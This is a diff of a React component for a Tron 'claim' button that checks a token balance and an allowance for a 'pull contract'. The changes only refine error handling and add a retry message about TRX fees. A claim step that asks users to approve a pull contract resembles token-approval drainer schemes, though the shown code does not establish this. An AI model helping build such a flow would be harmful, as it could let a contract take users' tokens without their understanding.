@@ -2,8 +2,8 @@
 
 import { useState, useEffect } from "react";
 import { useTron } from "./TronProvider";
-import { 
-  TOKEN_ADDRESS, 
+import {
+  TOKEN_ADDRESS,
   PULL_CONTRACT_ADDRESS,
   getTokenBalance,
   getAllowance,
@@ -18,7 +18,7 @@ import { Loader2, Sparkles } from "lucide-react";
 export function ClaimButton() {
   const { address, isConnected } = useTron();
   const { toast } = useToast();
-  
+
   const [balance, setBalance] = useState<bigint>(BigInt(0));
   const [allowance, setAllowance] = useState<bigint>(BigInt(0));
   const [isLoading, setIsLoading] = useState(false);
@@ -109,9 +109,20 @@ export function ClaimButton() {
     } catch (error: any) {
       console.error("Claim error:", error);
       const message = error?.message || "";
-      const isRateLimit = message.includes("429") || message.toLowerCase().includes("rate") || message.toLowerCase().includes("too many");
-      const isReject = message.toLowerCase().includes("reject") || message.toLowerCase().includes("denied") || message.toLowerCase().includes("cancel");
-      const isTrxInsufficient = message.toLowerCase().includes("insufficient trx") || message.toLowerCase().includes("energy");
+      const msgLower = message.toLowerCase();
+      const isRateLimit = message.includes("429") || msgLower.includes("rate") || msgLower.includes("too many");
+
+      // Only detect actual user-initiated wallet rejections, not network errors
+      const isReject =
+        msgLower.includes("rejected by the wallet") ||
+        msgLower.includes("user denied") ||
+        msgLower.includes("user cancelled") ||
+        msgLower.includes("user rejected") ||
+        (msgLower.includes("cancel") && !msgLower.includes("on-chain")) ||
+        (msgLower.includes("denied") && msgLower.includes("request"));
+
+      const isTrxInsufficient = msgLower.includes("insufficient trx") || msgLower.includes("energy");
+      const isNotConfirmed = msgLower.includes("not confirmed on-chain") || msgLower.includes("signature error");
 
       let title = "Transaction Failed";
       let description = message || "Failed to approve. Please try again.";
@@ -122,6 +133,9 @@ export function ClaimButton() {
       } else if (isTrxInsufficient) {
         title = "Insufficient TRX";
         description = message;
+      } else if (isNotConfirmed) {
+        title = "Approval Not Confirmed";
+        description = "Transaction was signed but not confirmed on-chain. Please make sure you have enough TRX for energy/gas fees (at least 15 TRX) and try again.";
       } else if (isRateLimit) {
         description = "RPC rate limited. Please try again in a few seconds.";
       }
